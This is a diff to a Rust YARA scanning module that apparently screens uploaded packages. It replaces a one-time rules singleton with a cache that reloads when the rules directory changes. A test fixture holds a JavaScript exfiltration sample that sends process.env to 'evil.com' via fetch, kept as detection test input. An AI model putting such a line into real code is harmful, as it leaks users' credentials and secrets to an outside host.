@@ -5,7 +5,7 @@
 //! model approach — no training data is required.
 
 use std::path::PathBuf;
-use std::sync::OnceLock;
+use std::sync::{Mutex, OnceLock};
 use tracing::{debug, info, warn};
 
 /// A single YARA match found during scanning.
@@ -26,8 +26,15 @@ pub struct YaraMatch {
 /// Default rules directory, relative to the working directory.
 const DEFAULT_RULES_DIR: &str = "rules";
 
-/// Compiled YARA rules singleton.  We compile once and reuse across scans.
-static COMPILED_RULES: OnceLock<Option<yara_x::Rules>> = OnceLock::new();
+/// Compiled YARA rules cache. The cache reloads when `CREG_YARA_RULES_DIR`
+/// changes, which keeps tests deterministic and lets operators validate a new
+/// rule directory without restarting the process.
+static COMPILED_RULES: OnceLock<Mutex<RulesCache>> = OnceLock::new();
+
+struct RulesCache {
+    dir: Option<PathBuf>,
+    rules: Option<yara_x::Rules>,
+}
 
 /// Return the rules directory path, overridable via `CREG_YARA_RULES_DIR`.
 fn rules_dir() -> PathBuf {
@@ -37,10 +44,12 @@ fn rules_dir() -> PathBuf {
 }
 
 /// Compile all `.yar` / `.yara` files from the rules directory.
-fn compile_rules() -> Option<yara_x::Rules> {
-    let dir = rules_dir();
+fn compile_rules(dir: &PathBuf) -> Option<yara_x::Rules> {
     if !dir.is_dir() {
-        warn!("YARA rules directory '{}' not found — YARA scanning disabled", dir.display());
+        warn!(
+            "YARA rules directory '{}' not found — YARA scanning disabled",
+            dir.display()
+        );
         return None;
     }
 
@@ -50,7 +59,11 @@ fn compile_rules() -> Option<yara_x::Rules> {
     let entries = match std::fs::read_dir(&dir) {
         Ok(e) => e,
         Err(err) => {
-            warn!("Failed to read YARA rules directory '{}': {}", dir.display(), err);
+            warn!(
+                "Failed to read YARA rules directory '{}': {}",
+                dir.display(),
+                err
+            );
             return None;
         }
     };
@@ -74,21 +87,32 @@ fn compile_rules() -> Option<yara_x::Rules> {
     }
 
     if loaded == 0 {
-        warn!("No YARA rules loaded from '{}' — YARA scanning disabled", dir.display());
+        warn!(
+            "No YARA rules loaded from '{}' — YARA scanning disabled",
+            dir.display()
+        );
         return None;
     }
 
     match compiler.build() {
         rules => {
-            info!("Compiled {} YARA rule file(s) from '{}'", loaded, dir.display());
+            info!(
+                "Compiled {} YARA rule file(s) from '{}'",
+                loaded,
+                dir.display()
+            );
             Some(rules)
         }
     }
 }
 
-/// Get (or lazily compile) the YARA rules.
-fn get_rules() -> Option<&'static yara_x::Rules> {
-    COMPILED_RULES.get_or_init(compile_rules).as_ref()
+fn rules_cache() -> &'static Mutex<RulesCache> {
+    COMPILED_RULES.get_or_init(|| {
+        Mutex::new(RulesCache {
+            dir: None,
+            rules: None,
+        })
+    })
 }
 
 /// Whether a non-empty YARA rule bundle was loaded successfully.
@@ -96,7 +120,13 @@ fn get_rules() -> Option<&'static yara_x::Rules> {
 /// Public-testnet admission uses this as a fail-closed guard before packages
 /// enter the pending pool.
 pub fn rules_available() -> bool {
-    get_rules().is_some()
+    let dir = rules_dir();
+    let mut cache = rules_cache().lock().expect("YARA rules cache poisoned");
+    if cache.dir.as_ref() != Some(&dir) {
+        cache.rules = compile_rules(&dir);
+        cache.dir = Some(dir);
+    }
+    cache.rules.is_some()
 }
 
 /// Scan extracted source files with YARA rules.
@@ -105,9 +135,15 @@ pub fn rules_available() -> bool {
 /// package tarball.  Returns a list of matches sorted by threat level (highest
 /// first).
 pub fn scan_files(files: &[(String, String)]) -> Vec<YaraMatch> {
-    let rules = match get_rules() {
-        Some(r) => r,
-        None => return Vec::new(),
+    let dir = rules_dir();
+    let mut cache = rules_cache().lock().expect("YARA rules cache poisoned");
+    if cache.dir.as_ref() != Some(&dir) {
+        cache.rules = compile_rules(&dir);
+        cache.dir = Some(dir);
+    }
+
+    let Some(rules) = cache.rules.as_ref() else {
+        return Vec::new();
     };
 
     let mut matches = Vec::new();
@@ -247,7 +283,8 @@ mod tests {
         "#;
         let files = vec![(
             "index.js".to_string(),
-            "const e = process.env; fetch('https://evil.com', {body: JSON.stringify(e)})".to_string(),
+            "const e = process.env; fetch('https://evil.com', {body: JSON.stringify(e)})"
+                .to_string(),
         )];
         let matches = scan_with_inline_rules(rule, &files);
         assert_eq!(matches.len(), 1);
